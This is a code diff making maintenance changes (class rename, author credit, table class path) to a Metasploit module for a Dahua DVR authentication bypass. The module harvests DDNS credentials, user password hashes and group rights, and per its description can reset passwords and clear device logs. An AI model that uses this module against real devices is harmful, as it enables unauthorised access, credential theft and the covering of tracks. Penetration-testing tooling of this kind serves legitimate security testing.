@@ -1,4 +1,4 @@
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -8,8 +8,8 @@ class Metasploit3 < Msf::Auxiliary
       'Name'            => %q(Dahua DVR Auth Bypass Scanner),
       'Description'     => %q(Scans for Dahua-based DVRs and then grabs settings. Optionally resets a user's password and clears the device logs),
       'Author'          => [
+        'Tyler Bennett - Talos Consulting', # Metasploit module
         'Jake Reynolds - Depth Security', # Vulnerability Discoverer
-        'Tyler Bennett - Talos Infosec', # Metasploit Module
         'Jon Hart <jon_hart[at]rapid7.com>', # improved metasploit module
         'Nathan McBride' # regex extraordinaire
       ],
@@ -128,7 +128,7 @@ class Metasploit3 < Msf::Auxiliary
     sock.put(DDNS)
     return unless (response = sock.get_once)
     data = response.split(/&&[0-1]&&/)
-    ddns_table = Rex::Ui::Text::Table.new(
+    ddns_table = Rex::Text::Table.new(
       'Header' => 'Dahua DDNS Settings',
       'Indent' => 1,
       'Columns' => ['Peer', 'DDNS Service', 'DDNS Server', 'DDNS Port', 'Domain', 'Username', 'Password']
@@ -186,7 +186,7 @@ class Metasploit3 < Msf::Auxiliary
     connect
     sock.put(CHANNELS)
     data = sock.get_once.split('&&')
-    channels_table = Rex::Ui::Text::Table.new(
+    channels_table = Rex::Text::Table.new(
       'Header' => 'Dahua Camera Channels',
       'Indent' => 1,
       'Columns' => ['ID', 'Peer', 'Channels']
@@ -206,7 +206,7 @@ class Metasploit3 < Msf::Auxiliary
     return unless (response = sock.get_once)
     data = response.split('&&')
     usercount = 0
-    users_table = Rex::Ui::Text::Table.new(
+    users_table = Rex::Text::Table.new(
       'Header' => 'Dahua Users Hashes and Rights',
       'Indent' => 1,
       'Columns' => ['Peer', 'Username', 'Password Hash', 'Groups', 'Permissions', 'Description']
@@ -237,7 +237,7 @@ class Metasploit3 < Msf::Auxiliary
     sock.put(GROUPS)
     return unless (response = sock.get_once)
     data = response.split('&&')
-    groups_table = Rex::Ui::Text::Table.new(
+    groups_table = Rex::Text::Table.new(
       'Header' => 'Dahua groups',
       'Indent' => 1,
       'Columns' => ['ID', 'Peer', 'Group']
